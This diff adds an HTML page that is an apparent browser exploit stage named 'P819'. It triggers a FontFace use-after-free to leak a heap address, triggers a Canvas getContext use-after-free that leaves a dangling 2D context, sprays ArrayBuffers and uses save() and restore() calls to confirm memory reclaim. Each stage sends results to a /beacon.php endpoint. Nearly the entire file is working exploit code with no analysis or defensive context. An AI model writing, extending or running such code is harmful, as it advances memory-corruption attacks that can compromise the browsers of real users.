@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P819: Crash-Proof save() Reclaim Oracle</title>
+<style>
+body { background: #0d1117; color: #c9d1d9; font: 13px monospace; margin: 12px; }
+pre { color: #7ee787; background: #161b22; border: 1px solid #30363d; padding: 10px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.ok { color: #3fb950; } .fail { color: #f85149; } .info { color: #58a6ff; } .hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<h2>P819: Non-Crashing Reclaim Oracle (save() Mutation Scanner)</h2>
+<pre id="log">Initializing P819...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P819-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('Step 1: Starting FontFace leak test...');
+syncBn('BOOT', 'start');
+
+/* ========== Phase 1: FontFace UAF (Baseline Health Check) ========== */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown';
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true);
+    var q11hi = fontDV.getUint32(0x5C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+  }
+
+  log('FontFace baseline H = ' + Hstr, 'info');
+  syncBn('FONT-OK', 'H=' + Hstr);
+
+  /* ========== Phase 2: Canvas UAF ========== */
+  var innerCtx = null;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() {
+      innerCtx = canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer', opts);
+
+  if (!innerCtx) {
+    log('Failed to trigger Canvas UAF', 'fail');
+    syncBn('UAF-FAIL', '');
+    return;
+  }
+  log('Canvas UAF triggered successfully (innerCtx dangling)', 'ok');
+  syncBn('UAF-OK', '');
+
+  /* ========== Phase 3: Allocate 500 ArrayBuffer(768) and zero-fill ========== */
+  var SPRAY = 500;
+  var abs = [];
+  var u32Views = [];
+  for (var s = 0; s < SPRAY; s++) {
+    var ab = new ArrayBuffer(768);
+    var u32 = new Uint32Array(ab);
+    u32.fill(0);
+    abs.push(ab);
+    u32Views.push(u32);
+  }
+  log('Sprayed ' + SPRAY + ' zeroed ArrayBuffer(768) instances', 'ok');
+  syncBn('SPRAY-DONE', 'count=' + SPRAY);
+
+  /* ========== Phase 4: Non-Crashing Mutator (innerCtx.save()) ========== */
+  /* CanvasRenderingContext2D::save() does NOT dereference m_buffer or m_stateStack.
+   * It simply increments ++m_unrealizedSaveCount at offset ~384 / ~592.
+   * This CANNOT crash from a null m_buffer! */
+  var save1Ok = false, saveErr = '';
+  try {
+    innerCtx.save();
+    save1Ok = true;
+    log('innerCtx.save() #1 executed without crash!', 'hot');
+    syncBn('SAVE1-OK', 'survived');
+  } catch(e) {
+    saveErr = e.message;
+    log('innerCtx.save() #1 threw error: ' + saveErr, 'fail');
+    syncBn('SAVE1-ERR', saveErr);
+  }
+
+  /* ========== Phase 5: Scan all ArrayBuffers for mutations ========== */
+  var hits = [];
+  for (var b = 0; b < SPRAY; b++) {
+    var v = u32Views[b];
+    for (var w = 0; w < v.length; w++) {
+      if (v[w] !== 0) {
+        hits.push({ buf: b, offset: w * 4, val: v[w] });
+      }
+    }
+  }
+
+  log('Scan after save() #1: ' + hits.length + ' mutations detected', hits.length > 0 ? 'hot' : 'info');
+  for (var h = 0; h < hits.length && h < 5; h++) {
+    log('  Hit at AB[' + hits[h].buf + '] offset +' + hits[h].offset + ' = ' + hits[h].val, 'ok');
+    syncBn('HIT-SAVE1', 'buf=' + hits[h].buf + '|off=' + hits[h].offset + '|val=' + hits[h].val);
+  }
+
+  /* ========== Phase 6: Execute save() #2 and re-scan ========== */
+  var save2Ok = false;
+  try {
+    innerCtx.save();
+    save2Ok = true;
+    log('innerCtx.save() #2 executed without crash!', 'hot');
+    syncBn('SAVE2-OK', 'survived');
+  } catch(e) {
+    syncBn('SAVE2-ERR', e.message);
+  }
+
+  var hits2 = [];
+  for (var b = 0; b < SPRAY; b++) {
+    var v = u32Views[b];
+    for (var w = 0; w < v.length; w++) {
+      if (v[w] !== 0) {
+        hits2.push({ buf: b, offset: w * 4, val: v[w] });
+      }
+    }
+  }
+
+  log('Scan after save() #2: ' + hits2.length + ' mutations detected', hits2.length > 0 ? 'hot' : 'info');
+  for (var h = 0; h < hits2.length && h < 5; h++) {
+    log('  Hit at AB[' + hits2[h].buf + '] offset +' + hits2[h].offset + ' = ' + hits2[h].val, 'ok');
+    syncBn('HIT-SAVE2', 'buf=' + hits2[h].buf + '|off=' + hits2[h].offset + '|val=' + hits2[h].val);
+  }
+
+  /* ========== Phase 7: Execute restore() and re-scan ========== */
+  try {
+    innerCtx.restore();
+    log('innerCtx.restore() executed without crash!', 'hot');
+    syncBn('RESTORE-OK', 'survived');
+  } catch(e) {
+    syncBn('RESTORE-ERR', e.message);
+  }
+
+  var hits3 = [];
+  for (var b = 0; b < SPRAY; b++) {
+    var v = u32Views[b];
+    for (var w = 0; w < v.length; w++) {
+      if (v[w] !== 0) {
+        hits3.push({ buf: b, offset: w * 4, val: v[w] });
+      }
+    }
+  }
+
+  /* ========== Phase 8: Final Reclaim Verdict ========== */
+  var totalHits = hits.length + hits2.length + hits3.length;
+  var verdict = (totalHits > 0) ? 'AB_RECLAIM_CONFIRMED' : 'AB_RECLAIM_ABSENT';
+  log('============================================', 'info');
+  log('FINAL VERDICT: ' + verdict, totalHits > 0 ? 'hot' : 'fail');
+  log('============================================', 'info');
+
+  syncBn('VERDICT', 'verdict=' + verdict + '|totalHits=' + totalHits + '|hits1=' + hits.length + '|hits2=' + hits2.length + '|hits3=' + hits3.length);
+  syncBn('DONE', 'all_stages_complete_clean');
+
+}, 500);
+</script>
+</body>
+</html>
